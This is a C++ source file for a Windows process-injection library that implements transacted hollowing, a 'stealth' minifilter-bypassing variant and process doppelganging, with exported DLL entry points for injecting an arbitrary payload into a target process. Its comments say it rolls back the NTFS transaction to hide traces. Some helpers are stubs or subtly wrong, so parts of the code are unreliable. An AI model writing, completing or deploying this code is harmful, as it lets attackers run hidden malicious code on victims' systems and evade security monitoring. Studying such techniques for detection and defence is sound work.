// TransactedHollowing.cpp - Process injection using NTFS transactions
#include <Windows.h>
#include "../../include/nt_compat.hpp"
#include <ktmw32.h>
#include <iostream>
#include <vector>
#include <string>
#include <memory>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "ktmw32.lib")

// Compatibility fallbacks
#ifndef TRANSACTION_EXECUTE_ASYNC
#define TRANSACTION_EXECUTE_ASYNC 0x00000040
#endif

struct TRANSACTION_ATTRIBUTES {
    ULONG IsolationLevel;
    ULONG IsolationFlags;
    ULONG Timeout;
};

#ifndef TRANSACTION_READ_UNCOMMITTED
#define TRANSACTION_READ_UNCOMMITTED 0x00000001
#endif

// NT function declarations
typedef NTSTATUS(NTAPI* pNtCreateSection)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES,
                                          PLARGE_INTEGER, ULONG, ULONG, HANDLE);
typedef NTSTATUS(NTAPI* pNtMapViewOfSection)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T,
                                             PLARGE_INTEGER, PSIZE_T, SECTION_INHERIT, ULONG, ULONG);
typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);
typedef NTSTATUS(NTAPI* pRtlCreateProcessParametersEx)(PVOID*, PUNICODE_STRING,
                                                       PUNICODE_STRING, PUNICODE_STRING, PUNICODE_STRING,
                                                       PVOID, PUNICODE_STRING, PUNICODE_STRING,
                                                       PUNICODE_STRING, PUNICODE_STRING, ULONG);
typedef NTSTATUS(NTAPI* pNtCreateProcessEx)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES,
                                            HANDLE, ULONG, HANDLE, HANDLE, HANDLE, BOOLEAN);
typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES,
                                           HANDLE, PVOID, PVOID, ULONG, ULONG_PTR,
                                           SIZE_T, SIZE_T, PVOID);

class TransactedHollowing {
private:
    // NT function pointers
    pNtCreateSection NtCreateSection;
    pNtMapViewOfSection NtMapViewOfSection;
    pNtUnmapViewOfSection NtUnmapViewOfSection;
    pRtlCreateProcessParametersEx RtlCreateProcessParametersEx;
    pNtCreateProcessEx NtCreateProcessEx;
    pNtCreateThreadEx NtCreateThreadEx;

    HANDLE m_hTransaction;
    HANDLE m_hTransactedFile;
    HANDLE m_hSection;
    HANDLE m_hProcess;
    HANDLE m_hThread;

public:
    TransactedHollowing() :
        m_hTransaction(INVALID_HANDLE_VALUE),
        m_hTransactedFile(INVALID_HANDLE_VALUE),
        m_hSection(nullptr),
        m_hProcess(nullptr),
        m_hThread(nullptr) {
        InitializeNtFunctions();
        std::cout << "[TransactedHollowing] Injector initialized" << std::endl;
    }

    ~TransactedHollowing() {
        Cleanup();
    }

    // Main transacted hollowing function
    bool InjectViaTransaction(const std::wstring& targetProcess, const std::vector<BYTE>& payload) {
        std::cout << "[TransactedHollowing] Starting transacted injection..." << std::endl;

        // Step 1: Create NTFS transaction
        if (!CreateTransaction()) {
            std::cerr << "[-] Failed to create transaction" << std::endl;
            return false;
        }

        // Step 2: Create transacted file with payload
        if (!CreateTransactedFile(payload)) {
            std::cerr << "[-] Failed to create transacted file" << std::endl;
            return false;
        }

        // Step 3: Create section from transacted file
        if (!CreateSectionFromFile()) {
            std::cerr << "[-] Failed to create section" << std::endl;
            return false;
        }

        // Step 4: Create process from section
        if (!CreateProcessFromSection(targetProcess)) {
            std::cerr << "[-] Failed to create process from section" << std::endl;
            return false;
        }

        // Step 5: Rollback transaction to hide traces
        RollbackTx();

        std::cout << "[+] Transacted hollowing successful!" << std::endl;
        return true;
    }

    // Alternative: Minifilter-bypassing transacted injection
    bool StealthTransactedInjection(const std::wstring& targetProcess, const std::vector<BYTE>& payload) {
        std::cout << "[TransactedHollowing] Starting stealth transacted injection..." << std::endl;

        // Create transaction with minimal footprint
        if (!CreateStealthTransaction()) {
            return false;
        }

        // Use temporary file in transaction
        std::wstring tempPath = GetTempTransactedPath();
        if (!WriteTransactedPayload(tempPath, payload)) {
            return false;
        }

        // Create section before process creation
        HANDLE hSection = CreateSectionFromTransactedPath(tempPath);
        if (!hSection) {
            return false;
        }

        // Map and execute
        bool success = MapAndExecute(targetProcess, hSection);

        // Always rollback to remove traces
        RollbackTx();

        CloseHandle(hSection);
        return success;
    }

    // Doppelganging variant using transacted files
    bool ProcessDoppelganging(const std::wstring& targetImage, const std::vector<BYTE>& payload) {
        std::cout << "[TransactedHollowing] Starting process doppelganging..." << std::endl;

        // Create transaction
        if (!CreateTransaction()) {
            return false;
        }

        // Overwrite legitimate executable in transaction
        if (!OverwriteFileInTransaction(targetImage, payload)) {
            return false;
        }

        // Create section from modified file
        HANDLE hSection = nullptr;
        if (!CreateSectionFromTransactedFile(targetImage, &hSection)) {
            return false;
        }

        // Create process from section
        HANDLE hProcess = nullptr;
        if (!CreateProcessFromSectionEx(hSection, &hProcess)) {
            CloseHandle(hSection);
            return false;
        }

        // Rollback transaction - file reverts to original
        RollbackTx();

        // Process continues running with payload
        std::cout << "[+] Process doppelganging successful!" << std::endl;

        CloseHandle(hSection);
        CloseHandle(hProcess);
        return true;
    }

private:
    void InitializeNtFunctions() {
        HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
        if (!hNtdll) return;

        NtCreateSection = (pNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
        NtMapViewOfSection = (pNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
        NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
        RtlCreateProcessParametersEx = (pRtlCreateProcessParametersEx)GetProcAddress(hNtdll, "RtlCreateProcessParametersEx");
        NtCreateProcessEx = (pNtCreateProcessEx)GetProcAddress(hNtdll, "NtCreateProcessEx");
        NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
    }

    bool CreateTransaction() {
        // Create NTFS transaction
        m_hTransaction = ::CreateTransaction(
            nullptr,           // No security attributes
            nullptr,           // Reserved
            TRANSACTION_DO_NOT_PROMOTE,  // Options
            0,                // Isolation level
            0,                // Isolation flags
            0,                // Timeout
            nullptr           // Description
        );

        if (m_hTransaction == INVALID_HANDLE_VALUE) {
            DWORD error = GetLastError();
            std::cerr << "[-] CreateTransaction failed: " << error << std::endl;
            return false;
        }

        std::cout << "[+] Created NTFS transaction" << std::endl;
        return true;
    }

    bool CreateStealthTransaction() {
        // Create transaction with stealth options
        TRANSACTION_ATTRIBUTES attrs = {0};
        attrs.IsolationLevel = TRANSACTION_READ_UNCOMMITTED;
        attrs.IsolationFlags = 0;
        attrs.Timeout = 0;

        m_hTransaction = ::CreateTransaction(
            nullptr,
            nullptr,
            TRANSACTION_DO_NOT_PROMOTE | TRANSACTION_EXECUTE_ASYNC,
            attrs.IsolationLevel,
            attrs.IsolationFlags,
            attrs.Timeout,
            L"TxF"  // Minimal description
        );

        return (m_hTransaction != INVALID_HANDLE_VALUE);
    }

    bool CreateTransactedFile(const std::vector<BYTE>& payload) {
        // Generate temporary file path
        wchar_t tempPath[MAX_PATH];
        GetTempPathW(MAX_PATH, tempPath);
        wcscat_s(tempPath, L"~tmp.exe");

        // Create file within transaction
        m_hTransactedFile = CreateFileTransactedW(
            tempPath,
            GENERIC_WRITE | GENERIC_READ,
            0,                    // No sharing
            nullptr,
            CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            nullptr,
            m_hTransaction,
            nullptr,
            nullptr
        );

        if (m_hTransactedFile == INVALID_HANDLE_VALUE) {
            std::cerr << "[-] CreateFileTransacted failed" << std::endl;
            return false;
        }

        // Write payload to transacted file
        DWORD written;
        if (!WriteFile(m_hTransactedFile, payload.data(), payload.size(), &written, nullptr)) {
            std::cerr << "[-] Failed to write payload" << std::endl;
            return false;
        }

        std::cout << "[+] Written " << written << " bytes to transacted file" << std::endl;
        return true;
    }

    std::wstring GetTempTransactedPath() {
        wchar_t tempPath[MAX_PATH];
        GetTempPathW(MAX_PATH, tempPath);

        // Generate random filename
        wchar_t filename[32];
        swprintf_s(filename, L"tx_%08X.tmp", GetTickCount());

        wcscat_s(tempPath, filename);
        return std::wstring(tempPath);
    }

    bool WriteTransactedPayload(const std::wstring& path, const std::vector<BYTE>& payload) {
        HANDLE hFile = CreateFileTransactedW(
            path.c_str(),
            GENERIC_WRITE | GENERIC_READ,
            0,
            nullptr,
            CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_TEMPORARY,
            nullptr,
            m_hTransaction,
            nullptr,
            nullptr
        );

        if (hFile == INVALID_HANDLE_VALUE) {
            return false;
        }

        DWORD written;
        bool success = WriteFile(hFile, payload.data(), payload.size(), &written, nullptr);

        CloseHandle(hFile);
        return success;
    }

    bool CreateSectionFromFile() {
        NTSTATUS status = NtCreateSection(
            &m_hSection,
            SECTION_ALL_ACCESS,
            nullptr,
            nullptr,
            PAGE_READONLY,
            SEC_IMAGE,
            m_hTransactedFile
        );

        if (!NT_SUCCESS(status)) {
            std::cerr << "[-] NtCreateSection failed: 0x" << std::hex << status << std::endl;
            return false;
        }

        std::cout << "[+] Created section from transacted file" << std::endl;
        return true;
    }

    HANDLE CreateSectionFromTransactedPath(const std::wstring& path) {
        HANDLE hFile = CreateFileTransactedW(
            path.c_str(),
            GENERIC_READ,
            FILE_SHARE_READ,
            nullptr,
            OPEN_EXISTING,
            0,
            nullptr,
            m_hTransaction,
            nullptr,
            nullptr
        );

        if (hFile == INVALID_HANDLE_VALUE) {
            return nullptr;
        }

        HANDLE hSection = nullptr;
        NTSTATUS status = NtCreateSection(
            &hSection,
            SECTION_ALL_ACCESS,
            nullptr,
            nullptr,
            PAGE_READONLY,
            SEC_IMAGE,
            hFile
        );

        CloseHandle(hFile);

        if (!NT_SUCCESS(status)) {
            return nullptr;
        }

        return hSection;
    }

    bool CreateSectionFromTransactedFile(const std::wstring& filePath, PHANDLE phSection) {
        HANDLE hFile = CreateFileTransactedW(
            filePath.c_str(),
            GENERIC_READ,
            FILE_SHARE_READ,
            nullptr,
            OPEN_EXISTING,
            0,
            nullptr,
            m_hTransaction,
            nullptr,
            nullptr
        );

        if (hFile == INVALID_HANDLE_VALUE) {
            return false;
        }

        NTSTATUS status = NtCreateSection(
            phSection,
            SECTION_ALL_ACCESS,
            nullptr,
            nullptr,
            PAGE_READONLY,
            SEC_IMAGE,
            hFile
        );

        CloseHandle(hFile);
        return NT_SUCCESS(status);
    }

    bool CreateProcessFromSection(const std::wstring& targetProcess) {
        // This creates a new process from our section
        // Note: Simplified implementation

        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi = {0};

        // Create suspended process to replace
        if (!CreateProcessW(
            targetProcess.c_str(),
            nullptr,
            nullptr,
            nullptr,
            FALSE,
            CREATE_SUSPENDED,
            nullptr,
            nullptr,
            &si,
            &pi)) {
            return false;
        }

        // Map section into new process
        PVOID baseAddress = nullptr;
        SIZE_T viewSize = 0;

        NTSTATUS status = NtMapViewOfSection(
            m_hSection,
            pi.hProcess,
            &baseAddress,
            0,
            0,
            nullptr,
            &viewSize,
            ViewShare,
            0,
            PAGE_EXECUTE_READWRITE
        );

        if (!NT_SUCCESS(status)) {
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return false;
        }

        // Update process parameters
        UpdateProcessParameters(pi.hProcess, baseAddress);

        // Resume process
        ResumeThread(pi.hThread);

        m_hProcess = pi.hProcess;
        m_hThread = pi.hThread;

        return true;
    }

    bool CreateProcessFromSectionEx(HANDLE hSection, PHANDLE phProcess) {
        // Use NtCreateProcessEx to create process directly from section
        NTSTATUS status = NtCreateProcessEx(
            phProcess,
            PROCESS_ALL_ACCESS,
            nullptr,
            GetCurrentProcess(),
            PROCESS_CREATE_FLAGS_INHERIT_HANDLES,
            hSection,
            nullptr,
            nullptr,
            FALSE
        );

        if (!NT_SUCCESS(status)) {
            return false;
        }

        // Create initial thread
        HANDLE hThread = nullptr;
        PVOID entryPoint = GetEntryPointFromSection(hSection);

        status = NtCreateThreadEx(
            &hThread,
            THREAD_ALL_ACCESS,
            nullptr,
            *phProcess,
            entryPoint,
            nullptr,
            0,
            0,
            0,
            0,
            nullptr
        );

        if (!NT_SUCCESS(status)) {
            TerminateProcess(*phProcess, 0);
            CloseHandle(*phProcess);
            *phProcess = nullptr;
            return false;
        }

        CloseHandle(hThread);
        return true;
    }

    bool MapAndExecute(const std::wstring& targetProcess, HANDLE hSection) {
        // Create target process
        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi = {0};

        if (!CreateProcessW(
            targetProcess.c_str(),
            nullptr,
            nullptr,
            nullptr,
            FALSE,
            CREATE_SUSPENDED,
            nullptr,
            nullptr,
            &si,
            &pi)) {
            return false;
        }

        // Map section
        PVOID baseAddress = nullptr;
        SIZE_T viewSize = 0;

        NTSTATUS status = NtMapViewOfSection(
            hSection,
            pi.hProcess,
            &baseAddress,
            0,
            0,
            nullptr,
            &viewSize,
            ViewShare,
            0,
            PAGE_EXECUTE_READWRITE
        );

        if (!NT_SUCCESS(status)) {
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return false;
        }

        // Set thread context to new entry point
        CONTEXT ctx;
        ctx.ContextFlags = CONTEXT_FULL;
        GetThreadContext(pi.hThread, &ctx);

#ifdef _WIN64
        ctx.Rcx = (DWORD64)baseAddress;
#else
        ctx.Eax = (DWORD)baseAddress;
#endif

        SetThreadContext(pi.hThread, &ctx);

        // Resume execution
        ResumeThread(pi.hThread);

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        return true;
    }

    bool OverwriteFileInTransaction(const std::wstring& targetFile, const std::vector<BYTE>& payload) {
        // Open existing file in transaction
        HANDLE hFile = CreateFileTransactedW(
            targetFile.c_str(),
            GENERIC_WRITE | GENERIC_READ,
            0,
            nullptr,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            nullptr,
            m_hTransaction,
            nullptr,
            nullptr
        );

        if (hFile == INVALID_HANDLE_VALUE) {
            // If file doesn't exist, create it
            hFile = CreateFileTransactedW(
                targetFile.c_str(),
                GENERIC_WRITE | GENERIC_READ,
                0,
                nullptr,
                CREATE_NEW,
                FILE_ATTRIBUTE_NORMAL,
                nullptr,
                m_hTransaction,
                nullptr,
                nullptr
            );

            if (hFile == INVALID_HANDLE_VALUE) {
                return false;
            }
        }

        // Overwrite with payload
        SetFilePointer(hFile, 0, nullptr, FILE_BEGIN);
        DWORD written;
        bool success = WriteFile(hFile, payload.data(), payload.size(), &written, nullptr);

        // Truncate if payload is smaller
        if (success) {
            SetEndOfFile(hFile);
        }

        CloseHandle(hFile);
        return success;
    }

    void UpdateProcessParameters(HANDLE hProcess, PVOID imageBase) {
        // Update process parameters
        // This would involve updating PEB and process parameters
        // Simplified for brevity
    }

    PVOID GetEntryPointFromSection(HANDLE hSection) {
        // Map section locally to read headers
        PVOID localBase = nullptr;
        SIZE_T viewSize = 0;

        NTSTATUS status = NtMapViewOfSection(
            hSection,
            GetCurrentProcess(),
            &localBase,
            0,
            0,
            nullptr,
            &viewSize,
            ViewShare,
            0,
            PAGE_READONLY
        );

        if (!NT_SUCCESS(status)) {
            return nullptr;
        }

        // Read PE headers
        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)localBase;
        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((PBYTE)localBase + dosHeader->e_lfanew);
        PVOID entryPoint = (PVOID)((ULONG_PTR)localBase + ntHeaders->OptionalHeader.AddressOfEntryPoint);

        // Unmap local view
        NtUnmapViewOfSection(GetCurrentProcess(), localBase);

        return entryPoint;
    }

    void RollbackTx() {
        if (m_hTransaction != INVALID_HANDLE_VALUE) {
            ::RollbackTransaction(m_hTransaction);
            std::cout << "[+] Transaction rolled back - traces removed" << std::endl;
        }
    }

    void Cleanup() {
        if (m_hThread) {
            CloseHandle(m_hThread);
            m_hThread = nullptr;
        }

        if (m_hProcess) {
            CloseHandle(m_hProcess);
            m_hProcess = nullptr;
        }

        if (m_hSection) {
            CloseHandle(m_hSection);
            m_hSection = nullptr;
        }

        if (m_hTransactedFile != INVALID_HANDLE_VALUE) {
            CloseHandle(m_hTransactedFile);
            m_hTransactedFile = INVALID_HANDLE_VALUE;
        }

        if (m_hTransaction != INVALID_HANDLE_VALUE) {
            ::RollbackTransaction(m_hTransaction);
            CloseHandle(m_hTransaction);
            m_hTransaction = INVALID_HANDLE_VALUE;
        }
    }
};

// Export functions
extern "C" {
    __declspec(dllexport) void* CreateTransactedHollowing() {
        return new TransactedHollowing();
    }

    __declspec(dllexport) bool InjectTransacted(void* instance, const wchar_t* target,
                                                void* payload, size_t size) {
        if (TransactedHollowing* hollowing = (TransactedHollowing*)instance) {
            std::vector<BYTE> payloadVec((BYTE*)payload, (BYTE*)payload + size);
            return hollowing->InjectViaTransaction(target, payloadVec);
        }
        return false;
    }

    __declspec(dllexport) bool ProcessDoppelgang(void* instance, const wchar_t* target,
                                                 void* payload, size_t size) {
        if (TransactedHollowing* hollowing = (TransactedHollowing*)instance) {
            std::vector<BYTE> payloadVec((BYTE*)payload, (BYTE*)payload + size);
            return hollowing->ProcessDoppelganging(target, payloadVec);
        }
        return false;
    }

    __declspec(dllexport) void DestroyTransactedHollowing(void* instance) {
        delete (TransactedHollowing*)instance;
    }
}
